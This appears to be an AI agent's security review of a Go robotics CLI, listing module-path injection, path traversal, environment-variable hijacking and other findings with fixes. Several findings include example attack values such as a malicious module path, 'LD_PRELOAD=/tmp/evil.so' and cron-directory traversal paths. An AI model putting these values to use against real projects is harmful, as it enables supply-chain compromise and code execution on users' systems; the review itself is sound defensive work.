# Security Review

**Reviewer**: Security Review Agent
**Date**: 2026-04-12
**Scope**: Caddy model core cleanup -- component.go, build.go, mainfile.go, registry.go, robot.go, and general OWASP Top 10 2025 assessment.

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 0     |
| High     | 2     |
| Medium   | 5     |
| Low      | 4     |

---

## High Findings

### S-01: Malicious module path can inject arbitrary Go source via AddBlankImport

**File**: `pkg/componentregistry/mainfile.go` lines 15-68, called from `cmd/gorai/commands/component.go` line 107
**Severity**: High
**CWE**: CWE-94 (Code Injection)
**OWASP**: A05:2025 (Injection), A08:2025 (Software and Data Integrity Failures)

`AddBlankImport` accepts `modulePath` from user input (`os.Args[3]`) and uses `strconv.Quote()` to embed it as an import path in a Go source file. While `strconv.Quote` properly escapes the string for Go syntax, the fundamental issue is that an attacker-controlled module path gets written into the user's `main.go` as a blank import. When the project is subsequently compiled with `go build`, Go will fetch and execute `init()` from that module.

The attack flow:
1. Attacker tricks user into running `gorai component add github.com/evil/malware`
2. `component.go` runs `go get github.com/evil/malware@latest` (line 92) -- fetches the module
3. `AddBlankImport` writes `_ "github.com/evil/malware"` into `main.go` (line 107)
4. Next `go build` compiles and links the malicious module's `init()` into the binary

The module path itself is not validated against any allowlist, pattern, or registry before being passed to `go get`. When the input does not contain a dot (line 67), it is resolved through the local registry, which provides some trust. But when it contains a dot, any arbitrary module path is accepted directly (line 66).

Additionally, `os.Create(filePath)` at line 57 truncates the file before `format.Node` writes to it. If `format.Node` fails partway through, the user's `main.go` is left in a corrupted state with partial content.

**Recommendation**:
1. Validate module paths against a strict pattern (e.g., `^[a-zA-Z0-9._/-]+(@[a-zA-Z0-9._/-]+)?$`) before passing to `go get` and `AddBlankImport`. Reject paths containing backticks, semicolons, newlines, or other unexpected characters.
2. Write to a temporary file first, then rename atomically, so that `main.go` is never left in a corrupted state on write failure:
   ```go
   tmpPath := filePath + ".tmp"
   f, err := os.Create(tmpPath)
   // ... write and close ...
   os.Rename(tmpPath, filePath)
   ```

### S-02: GOOS/GOARCH values from --target flag are not validated before use in exec.Command environment

**File**: `cmd/gorai/commands/build.go` lines 79-106
**Severity**: High
**CWE**: CWE-20 (Improper Input Validation)
**OWASP**: A05:2025 (Injection)

The `--target` flag is split on `/` and the two parts are used directly as `GOOS` and `GOARCH` environment variables:

```go
parts := strings.SplitN(targetPlatform, "/", 2)
goos = parts[0]
goarch = parts[1]
...
cmd.Env = append(os.Environ(), "GOOS="+goos, "GOARCH="+goarch)
```

While `exec.Command("go", buildArgs...)` uses argument-list invocation (not a shell), the `GOOS` and `GOARCH` values flow into the Go toolchain's environment. The Go toolchain itself validates these values and will reject invalid ones, so direct command injection is not possible.

However, the `goos` and `goarch` values also flow into the `outputPath` default (derived from `cfg.Robot.Name`, which is validated). More importantly, these values are printed to stdout (line 91) and could be used in deployment suggestions (lines 118-120). An attacker providing a crafted target string with terminal escape sequences could exploit terminal injection.

Additionally, `outputPath` from the `--output` flag (line 33) has no path traversal protection. A value like `--output /etc/cron.d/payload` would write the compiled binary to an arbitrary location.

**Recommendation**:
1. Validate `goos` and `goarch` against Go's known valid values (`runtime.GOOS`/`GOARCH` lists, or `go tool dist list`).
2. Validate `outputPath` to prevent path traversal -- ensure it stays within the project directory or require a relative path.

---

## Medium Findings

### S-03: File overwrite without atomic write in AddBlankImport

**File**: `pkg/componentregistry/mainfile.go` lines 57-65
**Severity**: Medium
**CWE**: CWE-367 (TOCTOU Race), CWE-459 (Incomplete Cleanup)
**OWASP**: A08:2025 (Software and Data Integrity Failures)

```go
f, err := os.Create(filePath)
if err != nil {
    return fmt.Errorf("write %s: %w", filePath, err)
}
defer f.Close()

if err := format.Node(f, fset, node); err != nil {
    return fmt.Errorf("format %s: %w", filePath, err)
}
```

`os.Create` truncates the file to zero bytes immediately. If `format.Node` then fails (e.g., due to disk full, permission change, or AST formatting error), the user's `main.go` is left empty or with partial content. This is a data loss risk, not just a security risk.

There is also a TOCTOU gap: the file is parsed at one point and written at another. If the file changes between parse and write, the changes are silently lost.

**Recommendation**: Write to a temporary file, then `os.Rename` atomically:
```go
tmpPath := filePath + ".tmp"
f, err := os.Create(tmpPath)
// ... write, close, check errors ...
if err := os.Rename(tmpPath, filePath); err != nil {
    os.Remove(tmpPath)
    return err
}
```

### S-04: Registry file loading uses relative path from CWD without containment

**File**: `cmd/gorai/commands/component.go` lines 154-166
**Severity**: Medium
**CWE**: CWE-22 (Path Traversal)
**OWASP**: A01:2025 (Broken Access Control)

```go
candidates := []string{
    defaultRegistryPath,
    filepath.Join(os.Getenv("HOME"), ".gorai", "registry.json"),
}
```

The first candidate is `"registry.json"` (relative to CWD). If an attacker can influence the working directory (e.g., by placing a malicious `registry.json` in a directory they control and tricking the user into running `gorai` from that directory), they can supply a crafted registry that maps legitimate component names to malicious module paths. This combines with S-01 to create a full supply chain attack:

1. Attacker places malicious `registry.json` in a shared directory
2. User runs `gorai component add sensor/bno055` from that directory
3. Registry maps `sensor/bno055` to `github.com/evil/malware`
4. `go get` fetches the malicious module
5. The module's `init()` runs at compile time or binary startup

Additionally, `os.Getenv("HOME")` is attacker-controllable if the HOME environment variable is overridden. On shared systems or in CI/CD environments, this could point to an attacker-controlled directory.

**Recommendation**:
1. Log which registry file is being used so the user can verify the source.
2. Consider embedding a trusted default registry or fetching from a known URL with integrity verification.
3. Validate that the registry file path resolves to an expected location.

### S-05: External service environment variable keys from config not validated

**File**: `pkg/robot/robot.go` lines 856-858
**Severity**: Medium
**CWE**: CWE-74 (Injection)
**OWASP**: A05:2025 (Injection)

```go
for k, v := range svc.External.Env {
    cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", k, v))
}
```

While this uses `exec.Command` (not a shell) so the environment variables are passed directly to the process, the env variable keys from config are not validated. A crafted config could set environment variable keys like `LD_PRELOAD`, `LD_LIBRARY_PATH`, `PATH`, `HOME`, or `GOPATH` to influence the behavior of the child process in unexpected ways.

For example, setting `LD_PRELOAD=/tmp/evil.so` would cause the external service to load attacker-controlled code.

The command itself is validated by `validateExternalCommand()` (absolute path, no metacharacters, executable), but the execution environment is not hardened.

**Recommendation**:
1. Validate environment variable keys against an allowlist or blocklist. At minimum, reject keys starting with `LD_` or `DYLD_`, and reject overrides of `PATH`, `HOME`, and other security-sensitive variables.
2. Consider prefixing all user-defined env vars with `GORAI_` to prevent collision with system variables.

### S-06: `go mod tidy` error silently ignored after component add

**File**: `cmd/gorai/commands/component.go` lines 115-118
**Severity**: Medium
**CWE**: CWE-754 (Improper Check for Exceptional Conditions)
**OWASP**: A10:2025 (Mishandling of Exceptional Conditions)

```go
goTidy := exec.Command("go", "mod", "tidy")
goTidy.Stdout = os.Stdout
goTidy.Stderr = os.Stderr
goTidy.Run()
```

The return value from `goTidy.Run()` is discarded. If `go mod tidy` fails, it could leave the go.mod/go.sum in an inconsistent state. While this is primarily a reliability issue, inconsistent module state can lead to unexpected dependency resolution behavior -- potentially pulling different (and possibly compromised) versions of dependencies than expected.

**Recommendation**: Check and at least log the error:
```go
if err := goTidy.Run(); err != nil {
    r.logger.Warn("go mod tidy failed", "error", err)
}
```

### S-07: No TLS minimum version enforcement on embedded NATS server

**File**: `pkg/embeddednats/server.go` (referenced from `pkg/robot/robot.go` line 247)
**Severity**: Medium
**CWE**: CWE-326 (Inadequate Encryption Strength)
**OWASP**: A04:2025 (Cryptographic Failures)

When TLS is configured for the embedded NATS server, no minimum TLS version is set. The NATS server library may accept TLS 1.0 or 1.1 connections, which have known vulnerabilities (BEAST, POODLE, etc.).

**Recommendation**: Set `MinVersion: tls.VersionTLS12` in the TLS configuration when creating the embedded NATS server.

---

## Low Findings

### S-08: findConfigFile uses GORAI_ROBOT_NAME env var for path construction without sanitization

**File**: `cmd/gorai/commands/root.go` lines 133-139
**Severity**: Low
**CWE**: CWE-22 (Path Traversal)
**OWASP**: A01:2025 (Broken Access Control)

```go
if name := os.Getenv("GORAI_ROBOT_NAME"); name != "" {
    path := name + ".json"
    if _, err := os.Stat(path); err == nil {
        return path
    }
}
```

The `GORAI_ROBOT_NAME` environment variable is used to construct a file path without sanitization. A value like `../../etc/cron.d/evil` would attempt to read `../../etc/cron.d/evil.json`. However, the impact is limited because:
- The file must exist and be valid JSON/RDL to be loaded
- The attacker must control the environment variable
- The config is only read, not written to that path

In `build.go`, this config path gets passed to `filepath.Abs()` (line 60), which normalizes the path but does not restrict it to a safe directory.

**Recommendation**: Validate that `GORAI_ROBOT_NAME` matches the `validateName` pattern (`^[a-zA-Z][a-zA-Z0-9_-]*$`) before using it in path construction.

### S-09: JSON parsing of registry file has no size limit

**File**: `pkg/componentregistry/registry.go` lines 11-20
**Severity**: Low
**CWE**: CWE-400 (Resource Exhaustion)
**OWASP**: A02:2025 (Security Misconfiguration)

```go
data, err := os.ReadFile(path)
...
json.Unmarshal(data, &reg)
```

`os.ReadFile` reads the entire file into memory without any size limit. A maliciously large registry file could exhaust memory. While this is a local file that the user must have placed on the filesystem, in shared environments or if the registry is fetched from a remote source in the future, this becomes a denial-of-service vector.

**Recommendation**: Add a file size check before reading, or use `io.LimitReader`:
```go
info, err := os.Stat(path)
if info.Size() > 10*1024*1024 { // 10MB limit
    return nil, fmt.Errorf("registry file too large")
}
```

### S-10: NATS connection URL logged in plaintext

**File**: `pkg/robot/robot.go` line 312
**Severity**: Low
**CWE**: CWE-532 (Information Exposure Through Log Files)
**OWASP**: A09:2025 (Logging Failures)

```go
r.logger.Info("Connected to NATS", "url", natsURL)
```

If NATS URLs contain embedded credentials (e.g., `nats://user:password@host:4222`), these will be logged in plaintext. This persists from the previous review.

**Recommendation**: Sanitize NATS URLs before logging by stripping any userinfo component.

### S-11: Robot shutdown holds mutex locks during potentially slow Close() calls

**File**: `pkg/robot/robot.go` lines 1024-1058
**Severity**: Low
**CWE**: CWE-667 (Improper Locking)
**OWASP**: A10:2025 (Mishandling of Exceptional Conditions)

The `Stop()` method holds `servicesMu.Lock()` and `componentsMu.Lock()` while iterating and calling `Close()` on each service/component:

```go
r.servicesMu.Lock()
for name, svc := range r.services {
    if closeable, ok := svc.(Closeable); ok {
        if err := closeable.Close(ctx); err != nil {
            // ...
        }
    }
}
r.services = make(map[string]any)
r.servicesMu.Unlock()
```

If a component's `Close()` method hangs or takes a long time (e.g., waiting for network timeout), the mutex is held, blocking any concurrent access to the services/components maps. While this is a shutdown path, it could cause the shutdown to hang indefinitely if a component's `Close()` does not respect the context timeout.

**Recommendation**:
1. Copy the map entries under the lock, then release the lock before calling `Close()` on each item.
2. Apply per-component timeout to each `Close()` call using the context.

---

## Positive Security Observations

1. **exec.Command uses argument lists, not shell strings** -- `component.go` and `build.go` both use `exec.Command("go", "get", ...)` and `exec.Command("go", buildArgs...)`, which avoids shell metacharacter injection (CWE-78). This is correct.

2. **External command validation is thorough** -- `validateExternalCommand()` (robot.go:787-819) requires absolute paths, rejects shell metacharacters, verifies file existence, checks it is not a directory, and checks execute permissions. This is strong defense-in-depth.

3. **Shutdown ordering is correct** -- `Stop()` closes external services first (they depend on NATS), then internal services (they depend on components), then components, then cameras, then cancels the context, then closes the NATS client, and finally shuts down the embedded NATS server. This is the correct reverse-dependency order.

4. **strconv.Quote is used for module paths** -- In `mainfile.go`, `strconv.Quote(modulePath)` properly escapes the module path for inclusion in Go source code, preventing Go syntax injection.

5. **Config validation is called before use** -- `build.go` calls `cfg.Validate()` before using `cfg.Robot.Name` as the default output path. The name validation (`^[a-zA-Z][a-zA-Z0-9_-]*$`, max 63 chars) constrains the value sufficiently for safe use in file paths and ldflags.

6. **JSON deserialization is safe** -- `json.Unmarshal` in `registry.go` is safe against code execution (unlike `pickle` in Python or `yaml.load` without `SafeLoader`). Go's `encoding/json` only populates struct fields.

7. **Component dependency topological sort** -- Components are started in dependency order and stopped in reverse, preventing use-before-init and dangling-reference issues.

8. **Robot name is validated before use in NATS subjects** -- The `validateName` pattern prevents injection of NATS wildcards (`*`, `>`) into topic strings built from robot/component names.

---

## Prior Review Items (from 2026-04-11)

The following items from the previous review remain relevant to the current scope:

| ID | Severity | Status | Notes |
|----|----------|--------|-------|
| S-05 (TLS) | Medium | Open | Still no TLS minimum version on embedded NATS (now S-07) |
| S-06 (NATS URL scheme) | Medium | Open | NATS URL scheme still not validated at config parse time |
| S-12 (NATS URL logging) | Low | Open | NATS URL still logged with potential credentials (now S-10) |

The following items from the previous review are **not applicable** to the current scope (Caddy model core cleanup) but remain open in the codebase:
- S-01 (Critical): Command injection in podman command construction -- `pkg/compose/compiler.go`
- S-02 (High): Command injection in native binary service command construction -- `pkg/compose/compiler.go`
- S-03 (High): Temp file cleanup on syscall.Exec -- `cmd/gorai/commands/run.go`
- S-04 (High): Env var values in shell commands -- `pkg/compose/compiler.go`
